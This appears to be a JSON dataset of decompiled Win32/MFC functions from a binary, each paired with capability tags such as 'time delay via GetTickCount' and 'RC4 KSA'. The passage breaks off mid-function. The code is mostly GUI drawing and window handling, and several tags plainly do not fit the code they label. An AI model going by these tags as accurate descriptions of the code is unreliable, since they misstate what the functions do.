    "00439116": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00439116(uint *arg_8h, int32_t arg_ch)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    int32_t var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4b8030 ^ &stack0xfffffffc;\n    if (arg_ch == 0) {\n        uVar2 = (*_sym.imp.USER32.dll_GetDC)(0);\n    }\n    else {\n        uVar2 = *(arg_ch + 8);\n    }\n    puVar5 = &var_40h;\n    for (iVar4 = 0xf; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = *arg_8h;\n        arg_8h = arg_8h + 1;\n        puVar5 = puVar5 + 1;\n    }\n    uVar3 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(uVar2, 0x5a, var_40h, 0x2d0);\n    var_44h = (*_sym.imp.KERNEL32.dll_MulDiv)(uVar3);\n    pcVar1 = _sym.imp.GDI32.dll_DPtoLP;\n    var_48h = 0;\n    (*_sym.imp.GDI32.dll_DPtoLP)(uVar2, &var_48h, 1);\n    uVar3 = 1;\n    var_50h = 0;\n    var_4ch = 0;\n    (*pcVar1)(uVar2, &var_50h);\n    iVar4 = fcn.0046415b(var_44h - var_4ch);\n    var_40h = -iVar4;\n    if (arg_ch == 0) {\n        (*_sym.imp.USER32.dll_ReleaseDC)(0, uVar2);\n    }\n    fcn.00432041(&var_40h);\n    fcn.0045e747(uVar3);\n    return;\n}\n",
        "token_count": 508
    },
    "0043b247": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043b247(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t in_ECX;\n    uint var_24h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    var_14h = 0;\n    var_10h = 0;\n    var_ch = fcn.0046415b(arg_8h);\n    puVar1 = fcn.0043b0af(&var_24h, 10000);\n    var_ch = *puVar1;\n    var_8h = puVar1[1];\n    var_4h = puVar1[2];\n    if (arg_8h < 0) {\n        puVar1 = fcn.0043b06c(&var_24h);\n        var_ch = *puVar1;\n        var_8h = puVar1[1];\n        var_4h = puVar1[2];\n    }\n    var_18h = fcn.0046415b(arg_ch);\n    if (arg_ch < 0) {\n        puVar1 = fcn.0043b06c(&var_24h);\n        var_18h = *puVar1;\n        var_14h = puVar1[1];\n        var_10h = puVar1[2];\n    }\n    uVar2 = fcn.0043afa8(&var_24h, &var_18h);\n    fcn.00439e9d(uVar2);\n    *(in_ECX + 8) = 0;\n    return;\n}\n",
        "token_count": 405
    },
    "00442bbe": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00442bbe(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t in_ECX;\n    int32_t lpRect;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    *(in_ECX + 0x5c) = 0xffffffff;\n    *(in_ECX + 0x60) = arg_8h;\n    *(in_ECX + 100) = arg_ch;\n    if (*(in_ECX + 0x20) != 0) {\n        uVar1 = fcn.0041be35();\n        if ((uVar1 & 0x300000) != 0) {\n            fcn.004171b0(0, 0, 1);\n            fcn.004171b0(1, 0, 1);\n            fcn.0041726d(3, 0);\n        }\n    }\n    (*_sym.imp.USER32.dll_GetClientRect)(*(in_ECX + 0x20), &lpRect);\n    *(in_ECX + 0x68) = var_8h - lpRect;\n    *(in_ECX + 0x6c) = var_4h - var_ch;\n    if (*(in_ECX + 0x20) != 0) {\n        fcn.00442557();\n        (*_sym.imp.USER32.dll_InvalidateRect)(*(in_ECX + 0x20), 0, 1);\n    }\n    return;\n}\n",
        "token_count": 342
    },
    "00443c17": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00443c17(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    int32_t *in_ECX;\n    uint var_10h;\n    uint var_ch;\n    int32_t *var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.0043026e();\n    iVar1 = *(iVar1 + 4);\n    if (arg_8h == 0) {\n        piVar2 = in_ECX[0x31];\n        if (piVar2 != NULL) {\n            if (piVar2[0x35] != 0) {\n                (**(*in_ECX + 0x10c))(0);\n            }\n            piVar2 = in_ECX[0x31];\n            if (piVar2 == NULL) {\n                return;\n            }\n            (**(*piVar2 + 0x14c))(0);\n            return;\n        }\n        var_4h = (**(*in_ECX + 0x60))();\n        if (var_4h != 0) {\n            piVar2 = fcn.00450f19();\n            var_8h = NULL;\n            iVar5 = (**(*in_ECX + 100))(&var_4h);\n            do {\n                piVar3 = fcn.00419143();\n                if (piVar3 != NULL) goto code_r0x00443dac;\n                fcn.00411e42();\n                do {\n                    piVar6 = fcn.00419143();\n                    if (piVar6 != piVar3) break;\ncode_r0x00443dac:\n                    iVar5 = (**(*in_ECX + 100))(&var_4h);\n                } while (iVar5 != 0);\n                piVar6 = fcn.00419143();\n                if ((piVar6 == NULL) || (piVar6 = (**(*piVar6 + 0x140))(),  piVar6 != piVar3)) {\n                    (**(*in_ECX + 0x94))(piVar3);\n                    if (piVar2 == piVar3) {\n                        (**(*piVar3 + 0x14c))(0);\n                        piVar3 = var_8h;\n                    }\n                    else {\n                        (**(*piVar3 + 0x60))();\n                        piVar3 = var_8h;\n                    }\n                }\n                var_8h = piVar3;\n            } while (iVar5 != 0);\n            if (var_8h != NULL) {\n                (**(*in_ECX + 0x94))(var_8h);\n                if (piVar2 == var_8h) {\n                    (**(*var_8h + 0x14c))(0);\n                }\n                else {\n                    (**(*var_8h + 0x60))();\n                }\n            }\n        }\n        piVar2 = *(iVar1 + 0x20);\n        iVar1 = fcn.00432ecc();\n        if ((((iVar1 == 0) && (piVar2 != NULL)) && (iVar1 = fcn.0041bf9b(),  iVar1 != 0)) &&\n           ((iVar1 = (**(*piVar2 + 0x120))(),  iVar1 != 0 && (piVar3 = (**(*piVar2 + 0x140))(),  piVar3 == piVar2)))) {\n            fcn.00425f5e();\n        }\n    }\n    else {\n        if (in_ECX[0x31] != 0) {\n            (**(*in_ECX + 0x108))();\n        }\n        piVar2 = fcn.00450f19();\n        if (piVar2 == NULL) {\n            if (*(iVar1 + 0x20) != 0) {\n                iVar1 = fcn.004122c3();\n                iVar5 = (*_sym.imp.USER32.dll_IsWindowVisible)(*(iVar1 + 0x20));\n                if ((iVar5 == 0) && (piVar2 = in_ECX[0x2c],  piVar2 != NULL)) {\n                    (**(*piVar2 + 0x18))(piVar2);\n                }\n                fcn.0041bf7a(5);\n                uVar4 = (*_sym.imp.USER32.dll_SetActiveWindow)(*(iVar1 + 0x20));\n                fcn.004185c5(uVar4);\n                (*_sym.imp.USER32.dll_SetForegroundWindow)(*(iVar1 + 0x20));\n            }\n        }\n        else {\n            iVar1 = (*_sym.imp.USER32.dll_IsWindowVisible)(piVar2[8]);\n            if ((iVar1 == 0) && (piVar3 = in_ECX[0x2c],  piVar3 != NULL)) {\n                (**(*piVar3 + 0x18))(piVar3);\n            }\n            (**(*piVar2 + 0x14c))(0xffffffff);\n            piVar3 = fcn.00419143();\n            if (piVar3 != NULL) {\n                (**(*piVar3 + 0x14c))(0xffffffff);\n                piVar2 = piVar3;\n            }\n            uVar4 = (*_sym.imp.USER32.dll_GetLastActivePopup)(piVar2[8]);\n            iVar1 = fcn.004185c5(uVar4);\n            (*_sym.imp.USER32.dll_SetForegroundWindow)(*(iVar1 + 0x20));\n            (**(*piVar2 + 0x164))(0);\n            (**(*piVar2 + 0x160))(1);\n        }\n        if (in_ECX[0x14] == 0) {\n            fcn.00432ebd(1);\n        }\n    }\n    piVar2 = in_ECX[0x2c];\n    if (piVar2 != NULL) {\n        if ((arg_8h == 0) && (in_ECX[0x2e] == 0)) {\n            return;\n        }\n        (**(*piVar2 + 0x1c))(piVar2, arg_8h);\n        in_ECX[0x2e] = arg_8h;\n    }\n    if (arg_8h != 0) {\n        fcn.0044f309(1, 0);\n    }\n    return;\n}\n",
        "token_count": 1409
    },
    "0044ca12": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0044ca12(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint uVar3;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar1 = fcn.00431b02(*(in_ECX + 0x24), 0x49fb08);\n    uVar3 = 0;\n    if (piVar1 == NULL) {\n        return 0;\n    }\n    var_18h = 0xffffffff;\n    var_24h._0_2_ = 3;\n    var_20h = 0;\n    var_1ch = 4;\n    var_14h = 0x20;\n    iVar2 = (**(*piVar1 + 0xc))(piVar1, &var_24h, 7, &var_4h);\n    if (iVar2 < 0) {\n        (**(*piVar1 + 8))(piVar1);\n        return 0;\n    }\n    if (arg_8h != 0) {\n        var_ch = arg_8h;\n        var_10h = 0x20;\n        var_8h = 0;\n        iVar2 = (**(*piVar1 + 0x1c))(piVar1, &var_24h, &var_10h, 0);\n        if (iVar2 < 0) goto code_r0x0044ca94;\n    }\n    uVar3 = 1;\ncode_r0x0044ca94:\n    (**(*piVar1 + 8))(piVar1);\n    return uVar3;\n}\n",
        "token_count": 430
    },
    "004528c5": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004528c5(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    \n    fcn.004522f6(&var_ch);\n    fcn.00453f6a(*0x4bb6c4, &var_ch, 0);\n    fcn.00452491(arg_10h, arg_14h, &var_ch);\n    fcn.00453f6a(*0x4bb6cc, &var_ch, 0);\n    fcn.00451a5d(arg_8h);\n    if (arg_ch != 0) {\n        iVar1 = fcn.004523d7(&var_ch);\n        if (iVar1 != 0) {\n            fcn.00453f6a(*0x4bb6c8, &var_ch, 0);\n            fcn.00452491(arg_10h, arg_14h, &var_ch);\n            fcn.00453f6a(*0x4bb6d0, &var_ch, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 259
    },
    "00453241": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00453241(uint arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t in_ECX;\n    int32_t iVar8;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar8 = 0;\n    if (*(in_ECX + 0x68) == 0) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.USER32.dll_GetCapture)();\n    iVar2 = fcn.004530bd(arg_8h, arg_ch);\n    if (iVar2 == 0) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = *(iVar2 + 0x20);\n    }\n    iVar3 = fcn.00419eed();\n    uVar4 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n    fcn.004185c5(uVar4);\n    iVar5 = fcn.00419eed();\n    var_ch = 0;\n    iVar6 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n    if (iVar2 != 0) {\n        iVar8 = (*_sym.imp.USER32.dll_GetWindowThreadProcessId)(iVar2, 0);\n    }\n    if ((iVar5 == 0) || (iVar7 = (*_sym.imp.USER32.dll_GetDesktopWindow)(),  iVar2 == iVar7)) {\n        uVar4 = *0x4bb618;\n        if (iVar1 == *(in_ECX + 0x20)) {\n            (*_sym.imp.USER32.dll_ReleaseCapture)();\n            uVar4 = *0x4bb618;\n        }\ncode_r0x00453335:\n        (*_sym.imp.USER32.dll_SetCursor)(uVar4);\n        goto code_r0x0045333b;\n    }\n    if (iVar2 == 0) {\ncode_r0x00453304:\n        if (iVar6 != iVar8) goto code_r0x00453309;\n    }\n    else {\n        if (iVar6 == iVar8) {\n            uVar4 = *(in_ECX + 0x20);\n            iVar7 = fcn.0041f790();\n            if (iVar7 != 0) {\n                var_ch = 1;\n                if (iVar5 != iVar3) {\n                    iVar2 = 0;\n                    goto code_r0x0045333b;\n                }\n                uVar4 = *0x4bb61c;\n                if (iVar1 != *(in_ECX + 0x20)) {\n                    (*_sym.imp.USER32.dll_SetCapture)(*(in_ECX + 0x20));\n                    uVar4 = *0x4bb61c;\n                }\n                goto code_r0x00453335;\n            }\n            goto code_r0x00453304;\n        }\ncode_r0x00453309:\n        iVar2 = 0;\n    }\n    if (iVar1 == *(in_ECX + 0x20)) {\n        (*_sym.imp.USER32.dll_ReleaseCapture)(uVar4);\n    }\ncode_r0x0045333b:\n    if (arg_10h != NULL) {\n        *arg_10h = var_ch;\n    }\n    return iVar2;\n}\n",
        "token_count": 756
    },
    "0045609e": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045609e(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    \n    fcn.0044cb50(&var_ch);\n    fcn.00453f6a(*0x4bb6c0, &var_ch, 0);\n    fcn.0044e6a5(arg_10h, arg_14h, &var_ch);\n    fcn.00453f6a(*0x4bb6cc, &var_ch, 0);\n    fcn.0044cbe9(arg_8h);\n    if (arg_ch != 0) {\n        iVar1 = fcn.0044ccbb(&var_ch);\n        if (iVar1 != 0) {\n            fcn.00453f6a(*0x4bb6c8, &var_ch, 0);\n            fcn.0044e6a5(arg_10h, arg_14h, &var_ch);\n            fcn.00453f6a(*0x4bb6d0, &var_ch, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 265
    },
    "0045a25e": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0045a25e(uint arg_8h)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    char cVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    char *pcVar6;\n    int32_t *in_ECX;\n    uint32_t uVar7;\n    char *pcVar8;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    iVar4 = *(*in_ECX + -0xc);\n    pcVar5 = fcn.0040f8a0(iVar4);\n    pcVar1 = pcVar5 + iVar4;\n    pcVar6 = pcVar5;\n    while (pcVar8 = pcVar6,  pcVar8 < pcVar1) {\n        pcVar6 = fcn.00464bbe(pcVar8);\n        if (*pcVar8 != arg_8h) {\n            uVar7 = pcVar6 - pcVar8;\n            pcVar2 = pcVar5 + uVar7;\n            for (var_4h = 0; (pcVar5 != pcVar2 && (var_4h < uVar7)); var_4h = var_4h + 1) {\n                cVar3 = *pcVar8;\n                pcVar8 = pcVar8 + 1;\n                *pcVar5 = cVar3;\n                pcVar5 = pcVar5 + 1;\n            }\n        }\n    }\n    *pcVar5 = '\\0';\n    fcn.0040f8d0(iVar4 - (pcVar8 - pcVar5));\n    return pcVar8 - pcVar5;\n}\n",
        "token_count": 379
    },
    "00414f23": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414f23(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    if ((arg_ch < arg_10h) || (arg_14h < arg_ch)) {\n        fcn.00414e09(arg_8h, arg_10h, 0, arg_14h, 0, \"%I64u\", 0xf112);\n    }\n    return;\n}\n",
        "token_count": 101
    },
    "0042a1db": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042a1db(uint *param_1)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(*param_1);\n    fcn.004102e0(*(param_1 + 2), uVar1 & 0xffff);\n    fcn.004102e0();\n    fcn.00429fd7(*param_1, uVar1 & 0xffff);\n    return;\n}\n",
        "token_count": 107
    },
    "0042eaaa": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4ch\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: hdc\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_52h\n// WARNING: Variable defined which should be unmapped: lpvObject\n// WARNING: Variable defined which should be unmapped: nWidth\n// WARNING: Variable defined which should be unmapped: nHeight\n\nvoid __cdecl fcn.0042eaaa(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    uint lpvObject;\n    uint nWidth;\n    uint nHeight;\n    uint var_52h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint hdc;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(0x58);\n    *(unaff_EBP + -0x3c) = vtable.CDC.0;\n    *(unaff_EBP + -0x38) = 0;\n    *(unaff_EBP + -0x34) = 0;\n    *(unaff_EBP + -0x30) = 0;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x4c) = vtable.CDC.0;\n    *(unaff_EBP + -0x48) = 0;\n    *(unaff_EBP + -0x44) = 0;\n    *(unaff_EBP + -0x40) = 0;\n    *(unaff_EBP + -0x18) = 0;\n    *(unaff_EBP + -0x1c) = vtable.CBitmap.0;\n    pcVar1 = _sym.imp.USER32.dll_GetSysColor;\n    *(unaff_EBP + -4) = 2;\n    uVar2 = (*pcVar1)(0x14);\n    fcn.0042e9db(uVar2);\n    *(unaff_EBP + -4) = 3;\n    uVar2 = (*pcVar1)(0x10);\n    fcn.0042e9db(uVar2);\n    pcVar1 = _sym.imp.GDI32.dll_CreateCompatibleDC;\n    *(unaff_EBP + -4) = 4;\n    var_18h = (*pcVar1)(0);\n    iVar3 = fcn.0042e171(var_18h);\n    if (iVar3 != 0) {\n        var_18h = (*pcVar1)(0);\n        iVar3 = fcn.0042e171(var_18h);\n        if (iVar3 != 0) {\n            iVar3 = *(unaff_EBP + 8);\n            (*_sym.imp.GDI32.dll_GetObjectA)(*(iVar3 + 4), 0x18, unaff_EBP + -100);\n            fcn.0042e48b();\n            var_18h = *(unaff_EBP + -0x60);\n            iVar4 = fcn.0042e4f4(var_18h, *(unaff_EBP + -0x5c), *(unaff_EBP + -0x54), *(unaff_EBP + -0x52), 0);\n            if (iVar4 != 0) {\n                var_18h = (*_sym.imp.GDI32.dll_CreateBitmap)(*(unaff_EBP + -0x60), *(unaff_EBP + -0x5c), 1, 1, 0);\n                iVar4 = fcn.0042e438();\n                if (iVar4 != 0) {\n                    uVar2 = fcn.0042e538(*(unaff_EBP + -0x38), *(iVar3 + 4));\n                    *(unaff_EBP + 8) = uVar2;\n                    var_18h = *(unaff_EBP + -0x48);\n                    iVar3 = fcn.0042e538(var_18h, *(unaff_EBP + -0x18));\n                    *(unaff_EBP + -0x14) = iVar3;\n                    if ((*(unaff_EBP + 8) != 0) && (iVar3 != 0)) {\n                        uVar2 = (*_sym.imp.GDI32.dll_GetPixel)(*(unaff_EBP + -0x38), 0, 0);\n                        uVar2 = fcn.0042d20d(uVar2);\n                        pcVar1 = _sym.imp.GDI32.dll_BitBlt;\n                        *(unaff_EBP + -0x10) = uVar2;\n                        (*pcVar1)(*(unaff_EBP + -0x48), 0, 0, *(unaff_EBP + -0x60), *(unaff_EBP + -0x5c), \n                                  *(unaff_EBP + -0x38), 0, 0, 0xcc0020);\n                        fcn.0042d20d(0xffffff);\n                        (*pcVar1)(*(unaff_EBP + -0x48), 0, 0, *(unaff_EBP + -0x60), *(unaff_EBP + -0x5c), \n                                  *(unaff_EBP + -0x38), 0, 0, 0x1100a6);\n                        if (*(unaff_EBP + 0xc) == 0) {\n                            uVar2 = 0;\n                        }\n                        else {\n                            uVar2 = *(*(unaff_EBP + 0xc) + 4);\n                        }\n                        iVar3 = fcn.0042e538(*(unaff_EBP + -0x38), uVar2);\n                        if (iVar3 != 0) {\n                            fcn.00439060(0, 0, *(unaff_EBP + -0x60), *(unaff_EBP + -0x5c), *(unaff_EBP + 0x10));\n                            fcn.0042d20d(0xffffff);\n                            uVar2 = fcn.0042e5d1(unaff_EBP + -0x2c);\n                            *(unaff_EBP + 0xc) = uVar2;\n                            (*pcVar1)(*(unaff_EBP + -0x38), 1, 1, *(unaff_EBP + -0x60), *(unaff_EBP + -0x5c), \n                                      *(unaff_EBP + -0x48), 0, 0, 0xe20746);\n                            fcn.0042e5d1(unaff_EBP + -0x24);\n                            (*pcVar1)(*(unaff_EBP + -0x38), 0, 0, *(unaff_EBP + -0x60), *(unaff_EBP + -0x5c), \n                                      *(unaff_EBP + -0x48), 0, 0, 0xe20746);\n                            fcn.0042e5d1(*(unaff_EBP + 0xc));\n                            fcn.0042d20d(*(unaff_EBP + -0x10));\n                        }\n                        fcn.0042e538(*(unaff_EBP + -0x48), *(*(unaff_EBP + -0x14) + 4));\n                        var_18h = *(unaff_EBP + -0x38);\n                        fcn.0042e538(var_18h, *(*(unaff_EBP + 8) + 4));\n                    }\n                }\n            }\n        }\n    }\n    *(unaff_EBP + -4) = 3;\n    *(unaff_EBP + -0x24) = vtable.CGdiObject.0;\n    fcn.0042e48b(var_18h);\n    *(unaff_EBP + -4) = 2;\n    *(unaff_EBP + -0x2c) = vtable.CGdiObject.0;\n    fcn.0042e48b();\n    *(unaff_EBP + -4) = 1;\n    *(unaff_EBP + -0x1c) = vtable.CGdiObject.0;\n    fcn.0042e48b();\n    *(unaff_EBP + -4) = 0;\n    fcn.0042e1eb();\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0042e1eb();\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 2156
    },
    "0042ef54": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: hDC\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_4ch\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: hdc\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: hbr\n// WARNING: Variable defined which should be unmapped: var_66h\n// WARNING: Variable defined which should be unmapped: lprc\n// WARNING: Variable defined which should be unmapped: var_5ch\n// WARNING: Variable defined which should be unmapped: var_58h\n// WARNING: Variable defined which should be unmapped: var_54h\n// WARNING: Variable defined which should be unmapped: var_50h\n// WARNING: Variable defined which should be unmapped: lpvObject\n// WARNING: Variable defined which should be unmapped: var_74h\n// WARNING: Variable defined which should be unmapped: var_70h\n\nvoid __cdecl fcn.0042ef54(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint lpvObject;\n    uint var_74h;\n    uint var_70h;\n    uint var_66h;\n    uint lprc;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint hdc;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint hDC;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint hbr;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(0x6c);\n    *(unaff_EBP + -0x40) = vtable.CDC.0;\n    *(unaff_EBP + -0x3c) = 0;\n    *(unaff_EBP + -0x38) = 0;\n    *(unaff_EBP + -0x34) = 0;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x50) = vtable.CDC.0;\n    *(unaff_EBP + -0x4c) = 0;\n    *(unaff_EBP + -0x48) = 0;\n    *(unaff_EBP + -0x44) = 0;\n    *(unaff_EBP + -0x30) = vtable.CDC.0;\n    *(unaff_EBP + -0x2c) = 0;\n    *(unaff_EBP + -0x28) = 0;\n    *(unaff_EBP + -0x24) = 0;\n    *(unaff_EBP + -0x14) = 0;\n    *(unaff_EBP + -0x18) = vtable.CBitmap.0;\n    *(unaff_EBP + -0x1c) = 0;\n    *(unaff_EBP + -0x20) = vtable.CBrush.0;\n    pcVar1 = _sym.imp.GDI32.dll_CreateCompatibleDC;\n    *(unaff_EBP + -4) = 4;\n    uVar2 = (*pcVar1)(0);\n    iVar3 = fcn.0042e171(uVar2);\n    if (iVar3 != 0) {\n        uVar2 = (*pcVar1)(0);\n        iVar3 = fcn.0042e171(uVar2);\n        if (iVar3 != 0) {\n            uVar2 = (*pcVar1)(0);\n            iVar3 = fcn.0042e171(uVar2);\n            if ((iVar3 != 0) &&\n               (iVar3 = (*_sym.imp.GDI32.dll_GetObjectA)(*(*(unaff_EBP + 8) + 4), 0x18, unaff_EBP + -0x78),  iVar3 != 0)\n               ) {\n                fcn.0042e48b();\n                iVar3 = fcn.0042e4f4(*(unaff_EBP + -0x74), *(unaff_EBP + -0x70), *(unaff_EBP + -0x68), \n                                     *(unaff_EBP + -0x66), 0);\n                pcVar1 = _sym.imp.GDI32.dll_CreateBitmap;\n                if (iVar3 != 0) {\n                    uVar2 = (*_sym.imp.GDI32.dll_CreateBitmap)(8, 8, 1, 1, 0x496144);\n                    fcn.0042e438(uVar2);\n                    fcn.0042e4d3(unaff_EBP + -0x18);\n                    fcn.0042e48b();\n                    (*pcVar1)(*(unaff_EBP + -0x74), *(unaff_EBP + -0x70), 1, 1, 0);\n                    fcn.0042e438();\n                    uVar2 = fcn.0042e538(*(unaff_EBP + -0x3c));\n                    *(unaff_EBP + 8) = uVar2;\n                    iVar3 = fcn.0042e538(*(unaff_EBP + -0x4c), *(unaff_EBP + -0x14));\n                    *(unaff_EBP + -0x10) = iVar3;\n                    if ((*(unaff_EBP + 8) != 0) && (iVar3 != 0)) {\n                        uVar2 = (*_sym.imp.GDI32.dll_GetPixel)(*(unaff_EBP + -0x3c), 0, 0);\n                        fcn.0042d20d(uVar2);\n                        pcVar1 = _sym.imp.GDI32.dll_BitBlt;\n                        (*_sym.imp.GDI32.dll_BitBlt)\n                                  (*(unaff_EBP + -0x4c), 0, 0, *(unaff_EBP + -0x74), *(unaff_EBP + -0x70), \n                                   *(unaff_EBP + -0x3c), 0, 0, 0xcc0020);\n                        fcn.0042d20d(0xffffff);\n                        (*pcVar1)(*(unaff_EBP + -0x4c), 0, 0, *(unaff_EBP + -0x74), *(unaff_EBP + -0x70), \n                                  *(unaff_EBP + -0x3c), 0, 0, 0xee0086);\n                        fcn.0042d20d();\n                        iVar3 = fcn.0042e538();\n                        *(unaff_EBP + 0xc) = iVar3;\n                        if (iVar3 != 0) {\n                            uVar2 = fcn.0042d2f4();\n                            uVar4 = fcn.0042d20d();\n                            *(unaff_EBP + 0x14) = uVar4;\n                            *(unaff_EBP + -0x58) = *(unaff_EBP + -0x74);\n                            *(unaff_EBP + -0x54) = *(unaff_EBP + -0x70);\n                            *(unaff_EBP + -0x60) = 0;\n                            *(unaff_EBP + -0x5c) = 0;\n                            (*_sym.imp.USER32.dll_FillRect)(*(unaff_EBP + -0x2c), 